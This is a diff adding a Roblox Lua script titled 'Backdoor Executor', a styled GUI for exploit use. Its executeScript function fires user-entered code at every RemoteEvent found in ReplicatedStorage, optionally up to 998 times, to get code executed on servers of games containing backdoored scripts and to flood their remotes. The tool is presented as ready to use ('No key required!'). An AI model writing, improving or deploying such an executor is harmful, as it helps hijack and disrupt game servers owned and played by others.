@@ -1,0 +1,740 @@
+-- Enhanced Executor GUI (Optimized) v2.2
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Constants
+local COLORS = {
+    Background = Color3.fromRGB(15, 15, 18),
+    TitleBar = Color3.fromRGB(25, 25, 32),
+    Input = Color3.fromRGB(22, 22, 28),
+    ExecuteBtn = Color3.fromRGB(60, 200, 120),
+    ClearBtn = Color3.fromRGB(120, 120, 220),
+    CloseBtn = Color3.fromRGB(220, 60, 80),
+    Success = Color3.fromRGB(150, 255, 180),
+    Warning = Color3.fromRGB(255, 200, 120),
+    Error = Color3.fromRGB(255, 120, 120),
+    Accent = Color3.fromRGB(100, 150, 255)
+}
+
+local SIZES = {
+    Main = UDim2.new(0, 580, 0, 430),
+    CloseBtn = UDim2.new(0, 35, 0, 35),
+    RepSection = UDim2.new(1, -30, 0, 65),
+    Buttons = UDim2.new(1, -30, 0, 50)
+}
+
+local MAX_SCRIPT_SIZE = 250000
+local MAX_REPETITIONS = 998
+
+-- Utility Functions
+local function createCorner(radius)
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, radius)
+    return corner
+end
+
+local function createStroke(color, thickness, transparency)
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = color
+    stroke.Thickness = thickness
+    stroke.Transparency = transparency or 0
+    return stroke
+end
+
+local function createGradient(colors, rotation)
+    local gradient = Instance.new("UIGradient")
+    gradient.Color = ColorSequence.new(colors)
+    gradient.Rotation = rotation or 0
+    return gradient
+end
+
+local function tween(obj, props, duration, style, direction)
+    return TweenService:Create(
+        obj,
+        TweenInfo.new(duration or 0.2, style or Enum.EasingStyle.Quad, direction or Enum.EasingDirection.Out),
+        props
+    )
+end
+
+-- Create ScreenGui
+local gui = Instance.new("ScreenGui")
+gui.Name = "ExecutorUI_" .. math.random(1000, 9999)
+gui.ResetOnSpawn = false
+gui.Parent = pcall(function() return CoreGui end) and CoreGui or Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Main Frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = SIZES.Main
+mainFrame.Position = UDim2.new(0.5, -290, 0, -500)
+mainFrame.BackgroundColor3 = COLORS.Background
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.ClipsDescendants = false
+mainFrame.Parent = gui
+
+createCorner(14).Parent = mainFrame
+createGradient({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 20, 25)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 20))
+}, 45).Parent = mainFrame
+
+local glowBorder = createStroke(COLORS.Accent, 2, 0.3)
+glowBorder.Parent = mainFrame
+
+-- Entrance animation
+tween(mainFrame, {Position = UDim2.new(0.5, -290, 0.5, -215)}, 0.7, Enum.EasingStyle.Quint):Play()
+
+-- Animated glow effect (optimized with coroutine cleanup)
+local glowActive = true
+task.spawn(function()
+    local colors = {COLORS.Accent, Color3.fromRGB(150, 100, 255)}
+    local idx = 1
+    while glowActive and glowBorder.Parent do
+        tween(glowBorder, {Color = colors[idx]}, 2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut):Play()
+        idx = idx % 2 + 1
+        task.wait(2)
+    end
+end)
+
+-- Title Bar
+local titleBar = Instance.new("Frame")
+titleBar.Name = "TitleBar"
+titleBar.Size = UDim2.new(1, 0, 0, 45)
+titleBar.BackgroundColor3 = COLORS.TitleBar
+titleBar.BorderSizePixel = 0
+titleBar.Parent = mainFrame
+
+createCorner(14).Parent = titleBar
+createGradient({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 40)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 25, 32))
+}, 90).Parent = titleBar
+
+-- Icon
+local icon = Instance.new("TextLabel")
+icon.Size = UDim2.new(0, 35, 0, 35)
+icon.Position = UDim2.new(0, 8, 0, 5)
+icon.BackgroundTransparency = 1
+icon.Text = "⚡"
+icon.Font = Enum.Font.GothamBold
+icon.TextSize = 24
+icon.TextColor3 = Color3.fromRGB(120, 170, 255)
+icon.Parent = titleBar
+
+-- Title Text
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -90, 1, 0)
+title.Position = UDim2.new(0, 45, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "Backdoor Executor"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 18
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = titleBar
+
+createGradient({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 170, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 140, 255))
+}).Parent = title
+
+-- Version label
+local versionLabel = Instance.new("TextLabel")
+versionLabel.Size = UDim2.new(0, 60, 0, 18)
+versionLabel.Position = UDim2.new(1, -105, 0, 14)
+versionLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+versionLabel.BorderSizePixel = 0
+versionLabel.Text = "v2.2"
+versionLabel.Font = Enum.Font.GothamBold
+versionLabel.TextSize = 11
+versionLabel.TextColor3 = Color3.fromRGB(150, 200, 255)
+versionLabel.Parent = titleBar
+createCorner(6).Parent = versionLabel
+
+-- Close Button
+local closeBtn = Instance.new("TextButton")
+closeBtn.Size = SIZES.CloseBtn
+closeBtn.Position = UDim2.new(1, -40, 0, 5)
+closeBtn.BackgroundColor3 = COLORS.CloseBtn
+closeBtn.BorderSizePixel = 0
+closeBtn.Text = "✕"
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.TextSize = 16
+closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeBtn.AutoButtonColor = false
+closeBtn.Parent = titleBar
+createCorner(8).Parent = closeBtn
+
+closeBtn.MouseEnter:Connect(function()
+    tween(closeBtn, {
+        BackgroundColor3 = Color3.fromRGB(255, 80, 100),
+        Size = UDim2.new(0, 37, 0, 37)
+    }):Play()
+end)
+closeBtn.MouseLeave:Connect(function()
+    tween(closeBtn, {
+        BackgroundColor3 = COLORS.CloseBtn,
+        Size = SIZES.CloseBtn
+    }):Play()
+end)
+
+-- Script Input Container
+local inputContainer = Instance.new("Frame")
+inputContainer.Size = UDim2.new(1, -30, 0, 200)
+inputContainer.Position = UDim2.new(0, 15, 0, 60)
+inputContainer.BackgroundColor3 = COLORS.Input
+inputContainer.BorderSizePixel = 0
+inputContainer.Parent = mainFrame
+
+createCorner(10).Parent = inputContainer
+createStroke(Color3.fromRGB(50, 50, 65), 1.5, 0.5).Parent = inputContainer
+
+-- Line numbers panel
+local lineNumbersPanel = Instance.new("Frame")
+lineNumbersPanel.Size = UDim2.new(0, 40, 1, 0)
+lineNumbersPanel.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
+lineNumbersPanel.BorderSizePixel = 0
+lineNumbersPanel.Parent = inputContainer
+createCorner(10).Parent = lineNumbersPanel
+
+local lineNumbers = Instance.new("TextLabel")
+lineNumbers.Size = UDim2.new(1, 0, 1, 0)
+lineNumbers.BackgroundTransparency = 1
+lineNumbers.Text = "1\n2\n3\n4\n5\n6\n7\n8\n9\n10"
+lineNumbers.Font = Enum.Font.Code
+lineNumbers.TextSize = 13
+lineNumbers.TextColor3 = Color3.fromRGB(100, 100, 120)
+lineNumbers.TextYAlignment = Enum.TextYAlignment.Top
+lineNumbers.Parent = lineNumbersPanel
+
+-- Script Input
+local scriptInput = Instance.new("TextBox")
+scriptInput.Size = UDim2.new(1, -48, 1, -8)
+scriptInput.Position = UDim2.new(0, 44, 0, 4)
+scriptInput.BackgroundTransparency = 1
+scriptInput.Text = "-- Backdoor Executor\nprint('Hello World')"
+scriptInput.Font = Enum.Font.Code
+scriptInput.TextSize = 14
+scriptInput.TextColor3 = Color3.fromRGB(230, 230, 240)
+scriptInput.TextXAlignment = Enum.TextXAlignment.Left
+scriptInput.TextYAlignment = Enum.TextYAlignment.Top
+scriptInput.ClearTextOnFocus = false
+scriptInput.MultiLine = true
+scriptInput.TextWrapped = true
+scriptInput.Parent = inputContainer
+
+-- Repetition Section
+local repSection = Instance.new("Frame")
+repSection.Size = SIZES.RepSection
+repSection.Position = UDim2.new(0, 15, 0, 275)
+repSection.BackgroundColor3 = COLORS.Input
+repSection.BorderSizePixel = 0
+repSection.Parent = mainFrame
+
+createCorner(10).Parent = repSection
+createStroke(Color3.fromRGB(50, 50, 65), 1.5, 0.5).Parent = repSection
+
+-- Repetition Label Container
+local repLabelContainer = Instance.new("Frame")
+repLabelContainer.Size = UDim2.new(1, 0, 0, 25)
+repLabelContainer.Position = UDim2.new(0, 0, 0, 8)
+repLabelContainer.BackgroundTransparency = 1
+repLabelContainer.Parent = repSection
+
+local repLabel = Instance.new("TextLabel")
+repLabel.Size = UDim2.new(0, 180, 1, 0)
+repLabel.Position = UDim2.new(0, 12, 0, 0)
+repLabel.BackgroundTransparency = 1
+repLabel.Text = "Repetitions (optional)"
+repLabel.Font = Enum.Font.GothamBold
+repLabel.TextSize = 13
+repLabel.TextColor3 = Color3.fromRGB(220, 220, 230)
+repLabel.TextXAlignment = Enum.TextXAlignment.Left
+repLabel.Parent = repLabelContainer
+
+-- Info Button
+local infoBtn = Instance.new("TextButton")
+infoBtn.Size = UDim2.new(0, 20, 0, 20)
+infoBtn.Position = UDim2.new(0, 165, 0, 2)
+infoBtn.BackgroundColor3 = Color3.fromRGB(80, 130, 220)
+infoBtn.BorderSizePixel = 0
+infoBtn.Text = "?"
+infoBtn.Font = Enum.Font.GothamBold
+infoBtn.TextSize = 13
+infoBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+infoBtn.AutoButtonColor = false
+infoBtn.ZIndex = 5
+infoBtn.Parent = repLabelContainer
+createCorner(10).Parent = infoBtn
+
+-- Tooltip
+local tooltip = Instance.new("Frame")
+tooltip.Size = UDim2.new(0, 300, 0, 55)
+tooltip.Position = UDim2.new(0, 190, 0, -5)
+tooltip.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+tooltip.BorderSizePixel = 0
+tooltip.Visible = false
+tooltip.ZIndex = 10
+tooltip.Parent = repLabelContainer
+
+createCorner(8).Parent = tooltip
+createStroke(Color3.fromRGB(80, 130, 220), 2).Parent = tooltip
+
+local tooltipText = Instance.new("TextLabel")
+tooltipText.Size = UDim2.new(1, -20, 1, -10)
+tooltipText.Position = UDim2.new(0, 10, 0, 5)
+tooltipText.BackgroundTransparency = 1
+tooltipText.Text = "Enter how many times to execute this action.\nLeave blank for single execution.\nRange: 0-" .. MAX_REPETITIONS
+tooltipText.Font = Enum.Font.Gotham
+tooltipText.TextSize = 11
+tooltipText.TextColor3 = Color3.fromRGB(230, 230, 240)
+tooltipText.TextWrapped = true
+tooltipText.TextXAlignment = Enum.TextXAlignment.Left
+tooltipText.TextYAlignment = Enum.TextYAlignment.Top
+tooltipText.ZIndex = 11
+tooltipText.Parent = tooltip
+
+infoBtn.MouseEnter:Connect(function()
+    tooltip.Visible = true
+    tween(infoBtn, {BackgroundColor3 = Color3.fromRGB(100, 150, 240)}):Play()
+end)
+infoBtn.MouseLeave:Connect(function()
+    tooltip.Visible = false
+    tween(infoBtn, {BackgroundColor3 = Color3.fromRGB(80, 130, 220)}):Play()
+end)
+
+-- Input Container Frame
+local inputFrame = Instance.new("Frame")
+inputFrame.Size = UDim2.new(1, -24, 0, 30)
+inputFrame.Position = UDim2.new(0, 12, 0, 33)
+inputFrame.BackgroundTransparency = 1
+inputFrame.Parent = repSection
+
+-- Repetition Input
+local repInput = Instance.new("TextBox")
+repInput.Size = UDim2.new(0, 120, 1, 0)
+repInput.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
+repInput.BorderSizePixel = 0
+repInput.PlaceholderText = "Default: 1"
+repInput.Text = ""
+repInput.Font = Enum.Font.GothamBold
+repInput.TextSize = 15
+repInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+repInput.PlaceholderColor3 = Color3.fromRGB(120, 120, 140)
+repInput.ClearTextOnFocus = false
+repInput.TextXAlignment = Enum.TextXAlignment.Center
+repInput.Parent = inputFrame
+
+createCorner(8).Parent = repInput
+local repInputStroke = createStroke(Color3.fromRGB(70, 70, 85), 2, 0.3)
+repInputStroke.Parent = repInput
+
+local hintLabel = Instance.new("TextLabel")
+hintLabel.Size = UDim2.new(1, -130, 1, 0)
+hintLabel.Position = UDim2.new(0, 130, 0, 0)
+hintLabel.BackgroundTransparency = 1
+hintLabel.Text = "Range: 0-" .. MAX_REPETITIONS .. " (leave empty for 1)"
+hintLabel.Font = Enum.Font.Gotham
+hintLabel.TextSize = 12
+hintLabel.TextColor3 = Color3.fromRGB(150, 150, 170)
+hintLabel.TextXAlignment = Enum.TextXAlignment.Left
+hintLabel.Parent = inputFrame
+
+repInput.Focused:Connect(function()
+    tween(repInputStroke, {Color = COLORS.Accent, Transparency = 0}):Play()
+    tween(repInput, {BackgroundColor3 = Color3.fromRGB(35, 35, 45)}):Play()
+end)
+repInput.FocusLost:Connect(function()
+    tween(repInputStroke, {Color = Color3.fromRGB(70, 70, 85), Transparency = 0.3}):Play()
+    tween(repInput, {BackgroundColor3 = Color3.fromRGB(30, 30, 38)}):Play()
+end)
+
+-- Button Container
+local buttonContainer = Instance.new("Frame")
+buttonContainer.Size = SIZES.Buttons
+buttonContainer.Position = UDim2.new(0, 15, 1, -60)
+buttonContainer.BackgroundTransparency = 1
+buttonContainer.Parent = mainFrame
+
+-- Execute Button
+local executeBtn = Instance.new("TextButton")
+executeBtn.Size = UDim2.new(0.48, -4, 1, 0)
+executeBtn.BackgroundColor3 = COLORS.ExecuteBtn
+executeBtn.BorderSizePixel = 0
+executeBtn.Text = ""
+executeBtn.AutoButtonColor = false
+executeBtn.Parent = buttonContainer
+
+createCorner(10).Parent = executeBtn
+local execGradient = createGradient({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(70, 220, 140)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 180, 110))
+}, 90)
+execGradient.Parent = executeBtn
+
+local execIcon = Instance.new("TextLabel")
+execIcon.Size = UDim2.new(0, 25, 0, 25)
+execIcon.Position = UDim2.new(0, 15, 0.5, -12)
+execIcon.BackgroundTransparency = 1
+execIcon.Text = "▶"
+execIcon.Font = Enum.Font.GothamBold
+execIcon.TextSize = 18
+execIcon.TextColor3 = Color3.fromRGB(255, 255, 255)
+execIcon.Parent = executeBtn
+
+local execLabel = Instance.new("TextLabel")
+execLabel.Size = UDim2.new(1, -45, 1, 0)
+execLabel.Position = UDim2.new(0, 40, 0, 0)
+execLabel.BackgroundTransparency = 1
+execLabel.Text = "Execute"
+execLabel.Font = Enum.Font.GothamBold
+execLabel.TextSize = 16
+execLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+execLabel.TextXAlignment = Enum.TextXAlignment.Left
+execLabel.Parent = executeBtn
+
+executeBtn.MouseEnter:Connect(function()
+    tween(execGradient, {Rotation = 95}):Play()
+    tween(executeBtn, {Size = UDim2.new(0.48, -2, 1, 2)}):Play()
+end)
+executeBtn.MouseLeave:Connect(function()
+    tween(execGradient, {Rotation = 90}):Play()
+    tween(executeBtn, {Size = UDim2.new(0.48, -4, 1, 0)}):Play()
+end)
+
+-- Clear Button
+local clearBtn = Instance.new("TextButton")
+clearBtn.Size = UDim2.new(0.48, -4, 1, 0)
+clearBtn.Position = UDim2.new(0.52, 4, 0, 0)
+clearBtn.BackgroundColor3 = COLORS.ClearBtn
+clearBtn.BorderSizePixel = 0
+clearBtn.Text = ""
+clearBtn.AutoButtonColor = false
+clearBtn.Parent = buttonContainer
+
+createCorner(10).Parent = clearBtn
+local clearGradient = createGradient({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(140, 140, 240)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 100, 200))
+}, 90)
+clearGradient.Parent = clearBtn
+
+local clearIcon = Instance.new("TextLabel")
+clearIcon.Size = UDim2.new(0, 25, 0, 25)
+clearIcon.Position = UDim2.new(0, 10, 0.5, -12)
+clearIcon.BackgroundTransparency = 1
+clearIcon.Text = "🗑"
+clearIcon.Font = Enum.Font.GothamBold
+clearIcon.TextSize = 16
+clearIcon.TextColor3 = Color3.fromRGB(255, 255, 255)
+clearIcon.Parent = clearBtn
+
+local clearLabel = Instance.new("TextLabel")
+clearLabel.Size = UDim2.new(1, -38, 1, 0)
+clearLabel.Position = UDim2.new(0, 35, 0, 0)
+clearLabel.BackgroundTransparency = 1
+clearLabel.Text = "Clear"
+clearLabel.Font = Enum.Font.GothamBold
+clearLabel.TextSize = 16
+clearLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+clearLabel.TextXAlignment = Enum.TextXAlignment.Left
+clearLabel.Parent = clearBtn
+
+clearBtn.MouseEnter:Connect(function()
+    tween(clearGradient, {Rotation = 95}):Play()
+    tween(clearBtn, {Size = UDim2.new(0.48, -2, 1, 2)}):Play()
+end)
+clearBtn.MouseLeave:Connect(function()
+    tween(clearGradient, {Rotation = 90}):Play()
+    tween(clearBtn, {Size = UDim2.new(0.48, -4, 1, 0)}):Play()
+end)
+
+-- Status Bar
+local statusBar = Instance.new("Frame")
+statusBar.Size = UDim2.new(1, -30, 0, 28)
+statusBar.Position = UDim2.new(0, 15, 1, -88)
+statusBar.BackgroundColor3 = COLORS.TitleBar
+statusBar.BorderSizePixel = 0
+statusBar.Parent = mainFrame
+
+createCorner(8).Parent = statusBar
+createStroke(Color3.fromRGB(50, 50, 65), 1, 0.6).Parent = statusBar
+
+local statusIndicator = Instance.new("Frame")
+statusIndicator.Size = UDim2.new(0, 8, 0, 8)
+statusIndicator.Position = UDim2.new(0, 10, 0.5, -4)
+statusIndicator.BackgroundColor3 = Color3.fromRGB(100, 255, 150)
+statusIndicator.BorderSizePixel = 0
+statusIndicator.Parent = statusBar
+createCorner(4).Parent = statusIndicator
+
+-- Pulse animation (optimized)
+local pulseActive = true
+task.spawn(function()
+    while pulseActive and statusIndicator.Parent do
+        tween(statusIndicator, {BackgroundTransparency = 0.3}, 0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut):Play()
+        task.wait(0.5)
+        tween(statusIndicator, {BackgroundTransparency = 0}, 0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut):Play()
+        task.wait(0.5)
+    end
+end)
+
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Size = UDim2.new(1, -30, 1, 0)
+statusLabel.Position = UDim2.new(0, 25, 0, 0)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = "Ready to execute"
+statusLabel.Font = Enum.Font.GothamMedium
+statusLabel.TextSize = 13
+statusLabel.TextColor3 = Color3.fromRGB(200, 200, 210)
+statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+statusLabel.Parent = statusBar
+
+-- Toggle Button
+local toggleBtn = Instance.new("TextButton")
+toggleBtn.Size = UDim2.new(0, 60, 0, 60)
+toggleBtn.Position = UDim2.new(0, 20, 0, 100)
+toggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+toggleBtn.BorderSizePixel = 0
+toggleBtn.Text = ""
+toggleBtn.Active = true
+toggleBtn.Draggable = true
+toggleBtn.Visible = false
+toggleBtn.AutoButtonColor = false
+toggleBtn.Parent = gui
+
+createCorner(18).Parent = toggleBtn
+createStroke(COLORS.Accent, 2, 0.3).Parent = toggleBtn
+createGradient({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 50)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 30, 40))
+}, 45).Parent = toggleBtn
+
+local toggleIcon = Instance.new("TextLabel")
+toggleIcon.Size = UDim2.new(1, 0, 1, 0)
+toggleIcon.BackgroundTransparency = 1
+toggleIcon.Text = "⚡"
+toggleIcon.Font = Enum.Font.GothamBold
+toggleIcon.TextSize = 28
+toggleIcon.TextColor3 = Color3.fromRGB(120, 170, 255)
+toggleIcon.Parent = toggleBtn
+
+toggleBtn.MouseEnter:Connect(function()
+    tween(toggleBtn, {Size = UDim2.new(0, 65, 0, 65), BackgroundColor3 = Color3.fromRGB(40, 40, 50)}):Play()
+end)
+toggleBtn.MouseLeave:Connect(function()
+    tween(toggleBtn, {Size = UDim2.new(0, 60, 0, 60), BackgroundColor3 = Color3.fromRGB(30, 30, 40)}):Play()
+end)
+
+-- Core Functions
+local isExecuting = false
+
+local function updateStatus(text, color, indicatorColor)
+    statusLabel.Text = text
+    statusLabel.TextColor3 = color
+    if indicatorColor then
+        tween(statusIndicator, {BackgroundColor3 = indicatorColor}, 0.3):Play()
+    end
+end
+
+local function validateScript(code)
+    if code == "" or code == "-- Backdoor Executor\nprint('Hello World')" then
+        return false, "No script entered"
+    end
+    if #code > MAX_SCRIPT_SIZE then
+        return false, "Script too large (max " .. (MAX_SCRIPT_SIZE/1000) .. "k characters)"
+    end
+    return true, nil
+end
+
+local function validateRepetitions(text)
+    if text == "" or text:match("^%s*$") then
+        return true, 1
+    end
+    
+    local num = tonumber(text)
+    if not num then
+        return false, "Invalid input - enter a number"
+    end
+    
+    if num ~= math.floor(num) then
+        return false, "Must be a whole number"
+    end
+    
+    if num < 0 or num > MAX_REPETITIONS then
+        return false, "Must be between 0 and " .. MAX_REPETITIONS
+    end
+    
+    return true, math.floor(num)
+end
+
+local function executeScript(code)
+    local remoteCount = 0
+    local descendants = ReplicatedStorage:GetDescendants()
+    
+    for _, obj in ipairs(descendants) do
+        if obj:IsA("RemoteEvent") then
+            pcall(function()
+                obj:FireServer(code)
+                remoteCount += 1
+            end)
+        end
+    end
+    
+    return remoteCount
+end
+
+-- Execute Button Handler
+executeBtn.MouseButton1Click:Connect(function()
+    if isExecuting then
+        updateStatus("⚠ Execution in progress, please wait...", COLORS.Warning, Color3.fromRGB(255, 200, 100))
+        return
+    end
+    
+    local code = scriptInput.Text
+    local valid, error = validateScript(code)
+    
+    if not valid then
+        updateStatus("Error: " .. error, COLORS.Error, Color3.fromRGB(255, 100, 100))
+        task.wait(2)
+        updateStatus("Ready to execute", Color3.fromRGB(200, 200, 210), Color3.fromRGB(100, 255, 150))
+        return
+    end
+    
+    local repValid, repCount = validateRepetitions(repInput.Text)
+    
+    if not repValid then
+        updateStatus("Repetition Error: " .. repCount, COLORS.Error, Color3.fromRGB(255, 100, 100))
+        tween(repInputStroke, {Color = Color3.fromRGB(255, 100, 100), Transparency = 0, Thickness = 3}, 0.15):Play()
+        task.wait(0.3)
+        tween(repInputStroke, {Color = Color3.fromRGB(70, 70, 85), Transparency = 0.3, Thickness = 2}, 0.3):Play()
+        task.wait(1.5)
+        updateStatus("Ready to execute", Color3.fromRGB(200, 200, 210), Color3.fromRGB(100, 255, 150))
+        return
+    end
+    
+    isExecuting = true
+    
+    if repCount == 0 then
+        updateStatus("⚠ 0 repetitions - no execution performed", COLORS.Warning, Color3.fromRGB(255, 200, 100))
+        isExecuting = false
+        task.wait(2)
+        updateStatus("Ready to execute", Color3.fromRGB(200, 200, 210), Color3.fromRGB(100, 255, 150))
+        return
+    end
+    
+    updateStatus("Executing script...", COLORS.Warning, Color3.fromRGB(255, 200, 100))
+    tween(executeBtn, {BackgroundColor3 = Color3.fromRGB(80, 240, 160)}, 0.1):Play()
+    task.wait(0.1)
+    tween(executeBtn, {BackgroundColor3 = COLORS.ExecuteBtn}, 0.1):Play()
+    
+    if repCount == 1 then
+        local remoteCount = executeScript(code)
+        task.wait(0.3)
+        
+        if remoteCount > 0 then
+            updateStatus("✓ Executed successfully! Fired " .. remoteCount .. " remotes", COLORS.Success, Color3.fromRGB(100, 255, 150))
+        else
+            updateStatus("⚠ No remotes found in ReplicatedStorage", COLORS.Warning, Color3.fromRGB(255, 200, 100))
+        end
+        
+        isExecuting = false
+        task.wait(3)
+        updateStatus("Ready to execute", Color3.fromRGB(200, 200, 210), Color3.fromRGB(100, 255, 150))
+    else
+        task.spawn(function()
+            local totalRemotes = 0
+            local executionCount = 0
+            
+            for i = 1, repCount do
+                if not isExecuting then break end
+                
+                totalRemotes += executeScript(code)
+                executionCount = i
+                
+                if i % 20 == 0 or i == repCount or i == 1 or i == 10 or i == 50 or i == 100 then
+                    updateStatus("⚡ Executing: " .. i .. "/" .. repCount, Color3.fromRGB(150, 200, 255), Color3.fromRGB(120, 170, 255))
+                end
+                
+                if i % 50 == 0 then
+                    task.wait()
+                end
+            end
+            
+            isExecuting = false
+            
+            if executionCount == repCount then
+                updateStatus("✓ Complete! " .. executionCount .. " executions, " .. totalRemotes .. " total remotes fired", COLORS.Success, Color3.fromRGB(100, 255, 150))
+            else
+                updateStatus("⚠ Interrupted at " .. executionCount .. "/" .. repCount, COLORS.Warning, Color3.fromRGB(255, 200, 100))
+            end
+            
+            task.wait(4)
+            updateStatus("Ready to execute", Color3.fromRGB(200, 200, 210), Color3.fromRGB(100, 255, 150))
+        end)
+    end
+end)
+
+-- Clear Button Handler
+clearBtn.MouseButton1Click:Connect(function()
+    scriptInput.Text = ""
+    repInput.Text = ""
+    updateStatus("✓ Cleared", Color3.fromRGB(150, 200, 255), Color3.fromRGB(120, 170, 255))
+    
+    tween(clearBtn, {BackgroundColor3 = Color3.fromRGB(160, 160, 255)}, 0.1):Play()
+    task.wait(0.1)
+    tween(clearBtn, {BackgroundColor3 = COLORS.ClearBtn}, 0.1):Play()
+    
+    task.wait(1.5)
+    updateStatus("Ready to execute", Color3.fromRGB(200, 200, 210), Color3.fromRGB(100, 255, 150))
+end)
+
+-- Close Button Handler
+closeBtn.MouseButton1Click:Connect(function()
+    tween(mainFrame, {Position = UDim2.new(0.5, -290, 0, -500)}, 0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In):Play()
+    task.wait(0.5)
+    mainFrame.Visible = false
+    toggleBtn.Visible = true
+end)
+
+-- Toggle Button Handler
+toggleBtn.MouseButton1Click:Connect(function()
+    mainFrame.Visible = true
+    toggleBtn.Visible = false
+    mainFrame.Position = UDim2.new(0.5, -290, 0, -500)
+    tween(mainFrame, {Position = UDim2.new(0.5, -290, 0.5, -215)}, 0.6, Enum.EasingStyle.Quint):Play()
+end)
+
+-- Input validation
+repInput:GetPropertyChangedSignal("Text"):Connect(function()
+    local text = repInput.Text
+    local filtered = text:gsub("[^0-9]", "")
+    if filtered ~= text then
+        repInput.Text = filtered
+    end
+    if #filtered > 3 then
+        repInput.Text = filtered:sub(1, 3)
+    end
+end)
+
+-- Cleanup function
+local function cleanup()
+    glowActive = false
+    pulseActive = false
+end
+
+gui.Destroying:Connect(cleanup)
+
+-- Startup
+print("═══════════════════════════════════════")
+print("✓ Enhanced Executor v2.2 loaded!")
+print("✓ Optimized for better performance")
+print("✓ Range: 0-" .. MAX_REPETITIONS .. " executions")
+print("═══════════════════════════════════════")
+
+task.wait(0.8)
+updateStatus("✓ Executor ready - No key required!", COLORS.Success, Color3.fromRGB(100, 255, 150))
